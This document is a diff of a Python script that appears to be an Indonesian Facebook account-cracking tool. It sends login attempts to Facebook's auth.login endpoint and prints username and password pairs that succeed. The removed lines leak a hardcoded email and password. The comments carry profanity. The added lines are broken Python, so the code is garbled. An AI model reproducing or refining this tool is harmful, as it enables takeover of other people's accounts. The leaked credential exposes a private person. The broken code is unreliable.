@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-#Code by SyafiiXD 
-#Created 05-07-2020
-#My facebook (https://www.facebook.com/fikritampan305)
+username = 'SyafiiXD'
+Created =  06-07-2022
+My facebook = ('https://www.facebook.com/fikritampan305')
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
@@ -112,15 +112,15 @@ def moch_yayan():
              params = {
                      'access_token': b,
                      'format': 'JSON',
-                     'sdk_version': '2',
-                     'email': 'fikrirampan305',
+                     'sdk_version': '11',
+                     'email': username,
                      'locale': 'en_US',
-                     'password': '27121998nisah',
-                     'sdk': 'ios',
+                     'password': password,
+                     'sdk': 'android',
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://b-api.facebook.com/method/auth.login'
+             api = 'https://mobile.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
